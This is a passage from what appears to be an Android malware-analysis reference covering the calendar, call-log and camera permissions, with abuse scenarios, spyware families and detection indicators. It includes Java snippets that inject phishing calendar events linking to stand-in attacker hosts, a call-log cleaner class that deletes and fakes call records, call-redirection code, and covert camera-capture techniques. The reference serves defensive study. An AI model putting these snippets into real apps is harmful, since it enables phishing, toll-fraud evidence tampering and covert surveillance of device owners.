events"},{"location":"permissions/calendar/#spyware-families","title":"Spyware Families","text":"<p>Calendar exfiltration is a staple of targeted espionage toolkits:</p> Family Calendar Usage Pegasus (NSO Group) Exfiltrates full calendar database including attendees, locations, and notes FinSpy (Gamma Group) Reads calendar entries as part of broad PIM (Personal Information Manager) harvesting Hermit (RCS Lab) Collects calendar data alongside contacts and messages for target profiling AridSpy Exfiltrates calendar events from compromised devices in targeted Middle Eastern operations"},{"location":"permissions/calendar/#attack-scenarios","title":"Attack Scenarios","text":"<p>Meeting reconnaissance -- Calendar entries reveal where a target will be, when, and with whom. For a high-value target, this enables physical surveillance planning, room bugging, or interception at known future locations.</p> <p>Executive surveillance -- Corporate espionage operators harvest calendar data to map organizational structure. Recurring meetings with specific attendees reveal reporting lines, project teams, and decision-making circles that are not visible from an org chart alone.</p> <p>Social engineering with event details -- Stolen calendar data fuels highly convincing pretexting. An attacker who knows the target has a \"Q3 Budget Review with Sarah Chen at 2pm\" can craft a phishing email referencing that exact meeting, dramatically increasing the success rate.</p>"},{"location":"permissions/calendar/#write_calendar-abuse","title":"WRITE_CALENDAR Abuse","text":"<p><code>WRITE_CALENDAR</code> enables a subtle but effective attack vector: injecting phishing events directly into a target's calendar. The injected event includes a title like \"Action Required: Verify Account\" and a description containing a malicious URL. When the calendar fires a notification reminder, the target sees what appears to be a legitimate calendar event and clicks through.</p> <p>This technique bypasses email-based phishing defenses entirely. The malicious link never passes through an email gateway, spam filter, or URL scanner. It surfaces through a trusted channel -- the user's own calendar notifications -- and inherits the implicit trust that users place in their personal schedule.</p>"},{"location":"permissions/calendar/read-calendar/","title":"READ_CALENDAR","text":"<p>Allows reading all calendar events, attendees, and reminders from the device's calendar provider. Primarily relevant to targeted spyware and stalkerware rather than commodity malware.</p>"},{"location":"permissions/calendar/read-calendar/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CALENDAR</code> Protection Level <code>dangerous</code> Permission Group <code>CALENDAR</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/calendar/read-calendar/#what-it-enables","title":"What It Enables","text":"<p>Access to the <code>CalendarContract</code> content provider:</p> <pre><code>Cursor cursor = getContentResolver().query(\n    CalendarContract.Events.CONTENT_URI,\n    new String[]{\n        CalendarContract.Events.TITLE,\n        CalendarContract.Events.DTSTART,\n        CalendarContract.Events.EVENT_LOCATION,\n        CalendarContract.Events.DESCRIPTION\n    },\n    null, null, null\n);\n</code></pre> <p>Available data:</p> Data Field Event title <code>Events.TITLE</code> Start/end time <code>Events.DTSTART</code>, <code>Events.DTEND</code> Location <code>Events.EVENT_LOCATION</code> Description <code>Events.DESCRIPTION</code> Attendees <code>Attendees.ATTENDEE_EMAIL</code>, <code>ATTENDEE_NAME</code> Reminders <code>Reminders.MINUTES</code>, <code>METHOD</code> Calendar account <code>Calendars.ACCOUNT_NAME</code>"},{"location":"permissions/calendar/read-calendar/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/calendar/read-calendar/#targeted-espionage","title":"Targeted Espionage","text":"<p>Spyware targeting specific individuals extracts calendar data to map:</p> <ul> <li>Daily schedule and routines</li> <li>Meeting locations (physical surveillance planning)</li> <li>Professional contacts via attendee lists</li> <li>Business travel patterns</li> <li>Conference call details and dial-in numbers</li> </ul>"},{"location":"permissions/calendar/read-calendar/#commercial-spyware","title":"Commercial Spyware","text":"<p>Nation-state spyware (Pegasus, Predator) and commercial stalkerware apps routinely exfiltrate calendar data as part of full device surveillance.</p>"},{"location":"permissions/calendar/read-calendar/#low-priority-for-banking-trojans","title":"Low Priority for Banking Trojans","text":"<p>Most banking malware does not request calendar permissions. The data has no direct value for financial fraud.</p>"},{"location":"permissions/calendar/read-calendar/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CALENDAR\" /&gt;\n</code></pre> <p>Calendar access combined with other surveillance permissions (location, microphone, camera, contacts) suggests spyware. Calendar access alone is common in legitimate productivity apps.</p>"},{"location":"permissions/calendar/write-calendar/","title":"WRITE_CALENDAR","text":"<p>Allows creating, modifying, and deleting calendar events. Can be used for social engineering by injecting fake events with malicious links or phishing content into the victim's calendar.</p>"},{"location":"permissions/calendar/write-calendar/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CALENDAR</code> Protection Level <code>dangerous</code> Permission Group <code>CALENDAR</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/calendar/write-calendar/#what-it-enables","title":"What It Enables","text":"<p>Create, update, and delete events via <code>CalendarContract</code>:</p> <pre><code>ContentValues values = new ContentValues();\nvalues.put(CalendarContract.Events.TITLE, \"Security Alert: Verify Your Account\");\nvalues.put(CalendarContract.Events.DESCRIPTION, \"Click here: https://evil.com/phishing\");\nvalues.put(CalendarContract.Events.DTSTART, System.currentTimeMillis() + 3600000);\nvalues.put(CalendarContract.Events.DTEND, System.currentTimeMillis() + 7200000);\nvalues.put(CalendarContract.Events.CALENDAR_ID, 1);\nvalues.put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().getID());\ngetContentResolver().insert(CalendarContract.Events.CONTENT_URI, values);\n</code></pre>"},{"location":"permissions/calendar/write-calendar/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/calendar/write-calendar/#calendar-spam-phishing","title":"Calendar Spam / Phishing","text":"<p>Inject events containing phishing links into the victim's calendar. When the calendar notification fires, the user sees what appears to be a legitimate reminder with a malicious URL. This technique has been used in iOS calendar spam campaigns and applies equally to Android.</p> <p>Malware can inject events with reminders set minutes in the future, creating urgency:</p> <pre><code>ContentValues values = new ContentValues();\nvalues.put(CalendarContract.Events.TITLE, \"Account Locked - Verify Now\");\nvalues.put(CalendarContract.Events.DESCRIPTION, \"https://attacker-domain.com/verify\");\nvalues.put(CalendarContract.Events.DTSTART, System.currentTimeMillis() + 60000);\nvalues.put(CalendarContract.Events.DTEND, System.currentTimeMillis() + 120000);\nvalues.put(CalendarContract.Events.CALENDAR_ID, 1);\nvalues.put(CalendarContract.Events.EVENT_TIMEZONE, TimeZone.getDefault().getID());\nvalues.put(CalendarContract.Events.HAS_ALARM, 1);\nUri eventUri = getContentResolver().insert(CalendarContract.Events.CONTENT_URI, values);\n\nlong eventId = Long.parseLong(eventUri.getLastPathSegment());\nContentValues reminder = new ContentValues();\nreminder.put(CalendarContract.Reminders.EVENT_ID, eventId);\nreminder.put(CalendarContract.Reminders.MINUTES, 0);\nreminder.put(CalendarContract.Reminders.METHOD, CalendarContract.Reminders.METHOD_ALERT);\ngetContentResolver().insert(CalendarContract.Reminders.CONTENT_URI, reminder);\n</code></pre>"},{"location":"permissions/calendar/write-calendar/#event-manipulation","title":"Event Manipulation","text":"<p>Modify or delete existing events to disrupt a target's schedule (targeted harassment or sabotage).</p>"},{"location":"permissions/calendar/write-calendar/#calendar-data-as-reconnaissance","title":"Calendar Data as Reconnaissance","text":"<p>Commercial spyware platforms that request both <code>READ_CALENDAR</code> and <code>WRITE_CALENDAR</code> use calendar access primarily for intelligence collection rather than injection. Pegasus exfiltrates calendar events and meeting details as part of its comprehensive data collection. Hermit includes a dedicated calendar exfiltration module. FinSpy performs full calendar exfiltration alongside contacts. While these families focus on reading, <code>WRITE_CALENDAR</code> is often requested alongside <code>READ_CALENDAR</code> because they belong to the same permission group.</p>"},{"location":"permissions/calendar/write-calendar/#notable-families","title":"Notable Families","text":"Family Calendar Usage Pegasus Calendar event exfiltration for intelligence gathering Hermit Modular calendar exfiltration via dedicated C2 module FinSpy Full contacts and calendar exfiltration <p>No major Android malware families are known to use calendar injection as a primary attack vector. The technique is more common in iOS calendar spam campaigns and adware than in banking trojans or spyware.</p>"},{"location":"permissions/calendar/write-calendar/#android-version-changes","title":"Android Version Changes","text":"<p>Android 4.0 (API 14): <code>CalendarContract</code> API introduced, replacing the older undocumented calendar URIs. This standardized how apps interact with calendar data.</p> <p>Android 6.0 (API 23): <code>WRITE_CALENDAR</code> became a runtime permission. Granting it also grants <code>READ_CALENDAR</code> since both belong to the <code>CALENDAR</code> permission group.</p> <p>Android 10 (API 29): permission group auto-granting was tightened. The system may still grant both calendar permissions together, but apps cannot silently escalate from read to write.</p> <p>Android 14 (API 34): apps targeting API 34+ that access calendar data must declare the precise data types accessed in the privacy manifest.</p>"},{"location":"permissions/calendar/write-calendar/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CALENDAR\" /&gt;\n</code></pre> <p>Less commonly requested than <code>READ_CALENDAR</code>. Any app requesting write access without clear calendar management functionality is suspicious.</p>"},{"location":"permissions/calendar/write-calendar/#static-analysis-indicators","title":"Static Analysis Indicators","text":"<p>Look for references to <code>CalendarContract.Events.CONTENT_URI</code> with <code>insert()</code> or <code>update()</code> operations. Calendar injection malware typically constructs <code>ContentValues</code> with hardcoded or C2-provided event titles containing URLs.</p>"},{"location":"permissions/calendar/write-calendar/#dynamic-analysis-indicators","title":"Dynamic Analysis Indicators","text":"<ul> <li>New calendar events appearing without user action</li> <li>Events with titles containing URLs or urgent language (\"verify\", \"locked\", \"security alert\")</li> <li>Reminders set with zero-minute delays to trigger immediate notifications</li> <li>Bulk event insertion in short time periods</li> </ul>"},{"location":"permissions/calendar/write-calendar/#permission-combination-red-flags","title":"Permission Combination Red Flags","text":"<p><code>WRITE_CALENDAR</code> combined with <code>INTERNET</code> and <code>RECEIVE_BOOT_COMPLETED</code> suggests an app that persists across reboots and injects calendar events with content fetched from a remote server.</p>"},{"location":"permissions/call-log/","title":"Call Log Permissions","text":"<p>Access to the device's call history database. Call logs expose who the user communicates with, when, how often, and for how long. Valuable for spyware operators conducting surveillance, social graph mapping, and building behavioral profiles. Heavily restricted by Google Play since January 2019.</p>"},{"location":"permissions/call-log/#permissions","title":"Permissions","text":"Permission Abuse Potential READ_CALL_LOG Read complete call history: numbers, timestamps, duration, call type WRITE_CALL_LOG Insert or delete call records, cover tracks after malicious calls PROCESS_OUTGOING_CALLS Intercept outgoing calls, redirect to attacker-controlled numbers"},{"location":"permissions/call-log/#why-call-logs-matter-offensively","title":"Why Call Logs Matter Offensively","text":"<p>Call history provides a structured communication timeline. Unlike contacts (which are static), call logs show active relationships: who the target actually talks to, how frequently, and when. This data enables:</p> <ul> <li>Social graph mapping: identify close contacts by call frequency and duration</li> <li>Behavioral profiling: establish daily patterns, working hours, travel (via timezone-shifted calling patterns)</li> <li>Contact discovery: phone numbers in call logs may not exist in the contacts database</li> <li>Surveillance verification: confirm whether a target communicated with a specific number</li> <li>Correlation attacks: cross-reference call logs from multiple compromised devices to map networks</li> </ul>"},{"location":"permissions/call-log/#play-store-policy","title":"Play Store Policy","text":"<p>Since January 2019, Google restricts Call Log permissions to apps declared as the default dialer or that have an approved use case (call screening, caller ID). Apps that cannot justify the need are rejected from Play Store.</p> <p>This policy change pushed call log-stealing malware toward:</p> <ul> <li>Distribution via sideloading and third-party stores</li> <li>Using accessibility services to read call information from the screen instead</li> <li>Using notification listener to capture incoming call notifications</li> <li>Targeting pre-2019 devices where the restriction does not apply</li> </ul>"},{"location":"permissions/call-log/#common-permission-combinations","title":"Common Permission Combinations","text":"Combination Purpose <code>READ_CALL_LOG</code> + <code>READ_CONTACTS</code> Full communication graph: who the target knows and who they actually talk to <code>READ_CALL_LOG</code> + <code>READ_SMS</code> Complete communication surveillance across channels <code>READ_CALL_LOG</code> + <code>INTERNET</code> Call history exfiltration to C2 <code>WRITE_CALL_LOG</code> + <code>CALL_PHONE</code> Make calls and erase evidence from the log"},{"location":"permissions/call-log/process-outgoing-calls/","title":"PROCESS_OUTGOING_CALLS","text":"<p>Allows monitoring and redirecting outgoing phone calls. The app can see the number being dialed and optionally modify or cancel the call. Deprecated in Android 10.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.PROCESS_OUTGOING_CALLS</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 1 Deprecated API 29 (Android 10)"},{"location":"permissions/call-log/process-outgoing-calls/#what-it-enables","title":"What It Enables","text":"<p>Receive <code>NEW_OUTGOING_CALL</code> broadcast before a call is placed:</p> <pre><code>public class OutgoingCallReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);\n        // Can modify: setResultData(newNumber)\n        // Can cancel: setResultData(null)\n    }\n}\n</code></pre>"},{"location":"permissions/call-log/process-outgoing-calls/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/process-outgoing-calls/#call-redirection","title":"Call Redirection","text":"<p>Redirect calls to the bank's customer service number to an attacker-controlled number. The victim dials their bank, but the call goes to the attacker's call center.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#call-monitoring","title":"Call Monitoring","text":"<p>Log all outgoing calls (number, time) for surveillance.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#premium-number-substitution","title":"Premium Number Substitution","text":"<p>Replace outgoing call numbers with premium-rate numbers.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#android-version-changes","title":"Android Version Changes","text":"<p>Android 10 (API 29): deprecated. Replaced by <code>CallRedirectionService</code> role, which requires the user to explicitly set the app as the call redirection handler. Existing apps targeting older APIs still receive the broadcast.</p>"},{"location":"permissions/call-log/process-outgoing-calls/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.PROCESS_OUTGOING_CALLS\" /&gt;\n</code></pre> <p>Deprecated. Presence in modern apps targeting API 29+ is suspicious.</p>"},{"location":"permissions/call-log/read-call-log/","title":"READ_CALL_LOG","text":"<p>Grants read access to the device's call history via the CallLog content provider. Used by spyware for surveillance, social graph reconstruction, and behavioral profiling. Google Play has restricted this permission since January 2019, limiting distribution of apps that request it to those declared as the default dialer or with an approved use case.</p>"},{"location":"permissions/call-log/read-call-log/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.READ_CALL_LOG</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 16 (Android 4.1)"},{"location":"permissions/call-log/read-call-log/#what-it-enables","title":"What It Enables","text":"<p>Access to the call log content provider at <code>content://call_log/calls</code>. The app can query the complete call history stored on the device.</p> <pre><code>Cursor cursor = getContentResolver().query(\n    CallLog.Calls.CONTENT_URI,\n    null, null, null,\n    CallLog.Calls.DATE + \" DESC\"\n);\n</code></pre> <p>Data available per call record:</p> Field Content <code>NUMBER</code> Phone number of the other party <code>TYPE</code> Incoming (1), outgoing (2), missed (3), voicemail (4), rejected (5), blocked (6) <code>DATE</code> Timestamp of the call <code>DURATION</code> Call duration in seconds <code>CACHED_NAME</code> Contact name (if matched at call time) <code>CACHED_NUMBER_TYPE</code> Number type (mobile, home, work) <code>GEOCODED_LOCATION</code> Geographic label for the number <code>PHONE_ACCOUNT_ID</code> SIM or VoIP account used <code>IS_READ</code> Whether the missed call notification was seen <p>On most devices, the call log retains the last 500-1000 entries, depending on the manufacturer. Some OEMs keep significantly more.</p>"},{"location":"permissions/call-log/read-call-log/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/read-call-log/#surveillance-and-monitoring","title":"Surveillance and Monitoring","text":"<p>The primary use case in commercial spyware and stalkerware. Call logs provide a timestamped record of all voice communications. Spyware exfiltrates this data periodically to a C2 server, giving operators a real-time view of the target's calling activity.</p> <p>Notable families:</p> Family Call Log Usage Pegasus (NSO) Full call log exfiltration as part of comprehensive device surveillance Predator (Cytrox) Call history collection alongside other communication data Hermit (RCS Lab) Call log theft combined with call recording PhoneSpy Periodic call log dump to C2 Dracarys (Meta attribution) Call log exfiltration with contact and SMS data GravityRAT Call log theft targeting Indian and Pakistani users"},{"location":"permissions/call-log/read-call-log/#social-graph-mapping","title":"Social Graph Mapping","text":"<p>Call frequency and duration data reveals relationship strength. By analyzing call logs from a compromised device, an attacker can identify:</p> <ul> <li>The target's closest contacts (highest call frequency and duration)</li> <li>Work relationships (calls during business hours, short duration)</li> <li>Personal relationships (evening/weekend calls, longer duration)</li> <li>New or unusual contacts (recent entries not in the contacts database)</li> </ul> <p>When call logs from multiple compromised devices are correlated, entire organizational or social networks can be mapped.</p>"},{"location":"permissions/call-log/read-call-log/#behavioral-profiling","title":"Behavioral Profiling","text":"<p>Call timing patterns reveal daily routines:</p> <ul> <li>Sleep schedule (gap in calls)</li> <li>Work hours (consistent call patterns)</li> <li>Travel (calls to/from unusual area codes, international numbers)</li> <li>Meeting schedules (periods of no calls followed by clusters)</li> </ul>"},{"location":"permissions/call-log/read-call-log/#contact-discovery","title":"Contact Discovery","text":"<p>Phone numbers appearing in call logs but absent from the contacts database are especially interesting. These may represent:</p> <ul> <li>Burner phones</li> <li>Contacts the target has not saved (possibly sensitive)</li> <li>Numbers the target called once (services, temporary contacts)</li> </ul>"},{"location":"permissions/call-log/read-call-log/#android-version-changes","title":"Android Version Changes","text":"<p>Prior to API 16: call log access was bundled with <code>READ_CONTACTS</code>. No separate permission existed.</p> <p>Android 4.1 (API 16): <code>READ_CALL_LOG</code> introduced as a separate permission, decoupled from contacts.</p> <p>Android 6.0 (API 23): runtime permission required. <code>READ_CALL_LOG</code> was initially part of the <code>PHONE</code> permission group.</p> <p>Android 9.0 (API 28): <code>CALL_LOG</code> became its own permission group, separate from <code>PHONE</code>. Granting <code>READ_PHONE_STATE</code> no longer implicitly granted call log access.</p> <p>Android 10 (API 29): further isolation. Call log access strictly requires <code>READ_CALL_LOG</code>. No other permission grants indirect access.</p> <p>Google Play Policy (January 2019): only apps declared as the default dialer or with an approved exception may request <code>READ_CALL_LOG</code>. This does not affect sideloaded apps or apps distributed outside Play Store.</p>"},{"location":"permissions/call-log/read-call-log/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.READ_CALL_LOG\" /&gt;\n</code></pre> <p>High-risk indicators:</p> <ul> <li>Any app that is not a dialer, contacts manager, or call screening service requesting this permission</li> <li>Combined with <code>INTERNET</code> and <code>RECEIVE_BOOT_COMPLETED</code>: periodic exfiltration with persistence</li> <li>Combined with <code>READ_CONTACTS</code> and <code>READ_SMS</code>: comprehensive communication surveillance</li> <li><code>ContentResolver.query()</code> calls targeting <code>CallLog.Calls.CONTENT_URI</code> in background services</li> <li>Bulk queries with no date filtering (dumping entire call history rather than recent entries)</li> <li>Call log data being serialized to JSON/protobuf and written to files or sent over network</li> </ul>"},{"location":"permissions/call-log/write-call-log/","title":"WRITE_CALL_LOG","text":"<p>Allows inserting, modifying, and deleting call log entries. Can be used to hide evidence of calls made by malware (e.g., premium number calls, C2 voice calls) or to inject fake call records.</p>"},{"location":"permissions/call-log/write-call-log/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.WRITE_CALL_LOG</code> Protection Level <code>dangerous</code> Permission Group <code>CALL_LOG</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/call-log/write-call-log/#what-it-enables","title":"What It Enables","text":"<p>Write access to the <code>CallLog</code> content provider:</p> <pre><code>getContentResolver().delete(\n    CallLog.Calls.CONTENT_URI,\n    CallLog.Calls.NUMBER + \" = ?\",\n    new String[]{\"+1234567890\"}\n);\n</code></pre>"},{"location":"permissions/call-log/write-call-log/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/call-log/write-call-log/#evidence-removal","title":"Evidence Removal","text":"<p>After making premium-rate calls or C2 voice calls, malware deletes the call log entries to hide activity from the user.</p>"},{"location":"permissions/call-log/write-call-log/#call-log-manipulation","title":"Call Log Manipulation","text":"<p>Inject fake call records or modify timestamps to create alibis or frame targets.</p>"},{"location":"permissions/call-log/write-call-log/#notable-families","title":"Notable Families","text":"Family Usage Fakecalls Manipulates call logs as part of its vishing operation -- after intercepting calls to Korean banks and playing fake IVR audio, evidence of the intercepted calls must be cleaned GriftHorse Premium SMS/call fraud family where call log cleanup hides evidence of premium-rate call charges <p>Fakecalls is the most relevant family for <code>WRITE_CALL_LOG</code> abuse. Its call interception mechanism involves answering and redirecting calls to Korean bank numbers, and cleaning the call log is essential to preventing the victim from noticing that their outbound call to the bank was never actually connected. GriftHorse enrolled victims in premium services and cleaning call evidence reduced discovery speed.</p> <p>Most banking trojans that interact with calls (via <code>CALL_PHONE</code> or <code>ANSWER_PHONE_CALLS</code>) do not explicitly request <code>WRITE_CALL_LOG</code> because the call log evidence is secondary to the fraud itself. The permission is most critical for premium-rate call fraud where the victim would notice unexpected outbound calls on their bill.</p>"},{"location":"permissions/call-log/write-call-log/#evidence-cleanup-pattern","title":"Evidence Cleanup Pattern","text":"<p>The most common abuse of <code>WRITE_CALL_LOG</code> is removing traces of malicious call activity. After making premium-rate calls, C2 voice calls, or vishing calls, malware deletes the corresponding call log entries so the victim does not notice the unauthorized activity. This is especially important for malware that makes calls to premium numbers for revenue generation -- the call log entry would otherwise alert the victim and lead to faster detection.</p>"},{"location":"permissions/call-log/write-call-log/#abuse-code-example","title":"Abuse Code Example","text":"<pre><code>public class CallLogCleaner {\n\n    private final ContentResolver resolver;\n\n    public CallLogCleaner(ContentResolver resolver) {\n        this.resolver = resolver;\n    }\n\n    public int deleteCallsByNumber(String number) {\n        return resolver.delete(\n            CallLog.Calls.CONTENT_URI,\n            CallLog.Calls.NUMBER + \" = ?\",\n            new String[]{number}\n        );\n    }\n\n    public int deleteRecentOutgoing(int minutesAgo) {\n        long cutoff = System.currentTimeMillis() - (minutesAgo * 60 * 1000L);\n        return resolver.delete(\n            CallLog.Calls.CONTENT_URI,\n            CallLog.Calls.TYPE + \" = ? AND \" + CallLog.Calls.DATE + \" &gt; ?\",\n            new String[]{\n                String.valueOf(CallLog.Calls.OUTGOING_TYPE),\n                String.valueOf(cutoff)\n            }\n        );\n    }\n\n    public void injectFakeEntry(String number, String name, long timestamp, int duration) {\n        ContentValues values = new ContentValues();\n        values.put(CallLog.Calls.NUMBER, number);\n        values.put(CallLog.Calls.CACHED_NAME, name);\n        values.put(CallLog.Calls.DATE, timestamp);\n        values.put(CallLog.Calls.DURATION, duration);\n        values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);\n        values.put(CallLog.Calls.NEW, 0);\n        resolver.insert(CallLog.Calls.CONTENT_URI, values);\n    }\n\n    public void cleanupAfterPremiumCall(String premiumNumber) {\n        try {\n            Thread.sleep(3000);\n        } catch (InterruptedException e) {\n        }\n        deleteCallsByNumber(premiumNumber);\n    }\n}\n</code></pre> <p>The code shows three patterns: targeted deletion of specific numbers (used after C2 or premium calls), time-based deletion of recent outgoing calls (used as a broad cleanup), and fake entry injection (used to create alibis or frame targets). The <code>cleanupAfterPremiumCall</code> method includes a delay to ensure the call log entry has been written by the system before attempting deletion.</p>"},{"location":"permissions/call-log/write-call-log/#android-version-changes","title":"Android Version Changes","text":"<p>Android 9.0 (API 28): <code>WRITE_CALL_LOG</code> separated into its own <code>CALL_LOG</code> permission group, distinct from the <code>PHONE</code> permission group. Previously, granting phone permissions could implicitly grant call log access.</p> <p>January 2019: Google Play policy restricts call log permissions to apps declared as the default dialer or phone handler. Only default dialer/phone apps can access call log without scrutiny. Sideloaded malware and apps distributed through third-party stores are not subject to this restriction.</p> <p>Android 10 (API 29): further restrictions on call log access. Apps must hold the specific <code>WRITE_CALL_LOG</code> permission and cannot infer it from other phone-related permissions.</p> <p>Android 11 (API 30): no changes to the permission itself, but call screening and spam detection APIs provide alternative ways for legitimate apps to interact with calls without needing full call log write access.</p>"},{"location":"permissions/call-log/write-call-log/#detection","title":"Detection","text":"<p>In the manifest:</p> <pre><code>&lt;uses-permission android:name=\"android.permission.WRITE_CALL_LOG\" /&gt;\n</code></pre> <p>Only expected in dialer and call management apps.</p>"},{"location":"permissions/call-log/write-call-log/#analysis-indicators","title":"Analysis Indicators","text":"<ul> <li><code>ContentResolver.delete()</code> calls targeting <code>CallLog.Calls.CONTENT_URI</code> after outgoing call completion indicate evidence cleanup.</li> <li>Look for time-delayed deletion patterns -- malware typically waits a few seconds after a call ends before deleting the log entry to ensure the system has written it.</li> <li><code>ContentResolver.insert()</code> calls to <code>CallLog.Calls.CONTENT_URI</code> from non-dialer apps indicate fake call log injection.</li> <li>Combined with <code>CALL_PHONE</code> and <code>INTERNET</code>, <code>WRITE_CALL_LOG</code> suggests the app makes programmatic calls and cleans up afterward.</li> <li>Hardcoded premium-rate number prefixes (e.g., country-specific premium service codes) alongside call log deletion logic are a strong indicator of toll fraud with evidence cleanup.</li> <li>This permission is rare in malware overall. Its presence alongside <code>CALL_PHONE</code> significantly increases the likelihood of premium-rate call fraud or vishing-related cleanup activity.</li> </ul>"},{"location":"permissions/call-log/write-call-log/#see-also","title":"See Also","text":"<ul> <li>READ_CALL_LOG -- read access to call history, commonly paired with <code>WRITE_CALL_LOG</code> for full call log manipulation</li> <li>CALL_PHONE -- programmatic call initiation that creates the call log entries the malware then needs to delete</li> <li>ANSWER_PHONE_CALLS -- call interception capability that produces evidence requiring cleanup</li> <li>SMS Interception -- parallel evidence cleanup patterns exist in SMS-based attacks where malware deletes intercepted messages</li> </ul>"},{"location":"permissions/camera/","title":"Camera Permissions","text":"<p>Camera access grants the ability to capture photos and video from device cameras without the user physically pressing a shutter button. In an offense context, this permission enables covert environmental surveillance: photographing the victim, recording their surroundings, and capturing documents or screens visible to the camera.</p> <p>Stalkerware and state-sponsored spyware treat camera access as a core collection capability. Commercial spyware like Pegasus, Predator, and FinFisher all implement covert camera capture. Consumer-grade stalkerware apps marketed for \"parental monitoring\" or \"employee tracking\" rely on it heavily.</p>"},{"location":"permissions/camera/#permissions","title":"Permissions","text":"Permission Abuse Potential CAMERA Covert photo/video capture, environmental surveillance, QR code scanning for data exfiltration"},{"location":"permissions/camera/#key-considerations","title":"Key Considerations","text":"<p>Unlike permission groups with multiple members (SMS, Phone), the camera group contains a single runtime permission. However, effective camera abuse typically requires combining it with other permissions:</p> Combo Purpose <code>CAMERA</code> + <code>RECORD_AUDIO</code> Video with audio surveillance <code>CAMERA</code> + <code>INTERNET</code> Real-time streaming or image exfiltration <code>CAMERA</code> + <code>WRITE_EXTERNAL_STORAGE</code> Save captured media to disk for later exfiltration <code>CAMERA</code> + <code>FOREGROUND_SERVICE</code> (type <code>camera</code>) Sustained capture from background (Android 14+) <code>CAMERA</code> + <code>SYSTEM_ALERT_WINDOW</code> Overlay to hide camera preview while capturing"},{"location":"permissions/camera/#covert-capture-techniques","title":"Covert Capture Techniques","text":"<p>Silent camera capture requires suppressing the preview and shutter sound. Methods used by malware:</p> <ul> <li>1x1 pixel preview surface: create a <code>SurfaceView</code> or <code>TextureView</code> of 1x1 pixels, invisible to the user but sufficient for the camera API to operate</li> <li>Camera2 API with ImageReader: <code>ImageReader</code> as output surface with no preview, capturing directly to memory</li> <li>Overlay window: <code>SYSTEM_ALERT_WINDOW</code> places a transparent overlay that contains the preview surface, invisible to the user</li> <li>Foreground service: keeps the camera session alive when the app is not in the foreground</li> </ul> <p>Shutter sound suppression varies by region. In Japan and South Korea, the shutter sound is mandatory at the firmware level and cannot be muted programmatically. In other regions, malware mutes media volume before capture.</p>"},{"location":"permissions/camera/camera/","title":"CAMERA","text":"<p>Grants access to device cameras (front and rear) for photo and video capture. Used by spyware for covert environmental surveillance, capturing the victim's face, surroundings, and any documents or screens in view. One of the most privacy-invasive permissions, and a standard capability in both commercial spyware and stalkerware.</p>"},{"location":"permissions/camera/camera/#technical-details","title":"Technical Details","text":"Attribute Value Permission <code>android.permission.CAMERA</code> Protection Level <code>dangerous</code> Permission Group <code>CAMERA</code> Grant Method Runtime permission dialog Introduced API 1"},{"location":"permissions/camera/camera/#what-it-enables","title":"What It Enables","text":"<p>Two camera APIs exist on Android:</p>"},{"location":"permissions/camera/camera/#camera1-deprecated","title":"Camera1 (Deprecated)","text":"<pre><code>Camera camera = Camera.open(0);\ncamera.setPreviewTexture(surfaceTexture);\ncamera.startPreview();\ncamera.takePicture(null, null, pictureCallback);\n</code></pre> <p>Requires a preview surface. Malware uses a 1x1 pixel <code>SurfaceTexture</code> to satisfy this requirement invisibly.</p>"},{"location":"permissions/camera/camera/#camera2-api-21","title":"Camera2 (API 21+)","text":"<pre><code>CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);\nmanager.openCamera(cameraId, stateCallback, handler);\n</code></pre> <p>Camera2 supports <code>ImageReader</code> as an output target, enabling capture directly to a byte buffer without any visible preview. This is the preferred API for covert capture.</p>"},{"location":"permissions/camera/camera/#camerax-jetpack","title":"CameraX (Jetpack)","text":"<p>Higher-level abstraction over Camera2. Some stalkerware uses CameraX for simpler implementation, though Camera2 provides more control for stealth.</p>"},{"location":"permissions/camera/camera/#available-data","title":"Available Data","text":"Capability Details Still photos Full sensor resolution, front and rear cameras Video recording Requires <code>MediaRecorder</code> or <code>MediaCodec</code>, up to device-supported resolution Camera metadata Lens intrinsics, sensor orientation, exposure data Camera enumeration Number of cameras, facing direction, capabilities Depth data On supported devices, ToF/structured light depth maps"},{"location":"permissions/camera/camera/#abuse-in-malware","title":"Abuse in Malware","text":""},{"location":"permissions/camera/camera/#covert-photo-capture","title":"Covert Photo Capture","text":"<p>The primary abuse case. Malware captures still images silently:</p> <ol> <li>Open camera in a foreground service or with a transparent overlay</li> <li>Use a 1x1 pixel preview surface or <code>ImageReader</code>-only output</li> <li>Capture image to memory</li> <li>Compress and exfiltrate to C2 via HTTPS</li> <li>Release camera to avoid the in-use indicator on Android 12+</li> </ol> <p>Timing matters. Sophisticated spyware captures when the screen is on (camera quality is better, and the user is likely facing the front camera) or on C2 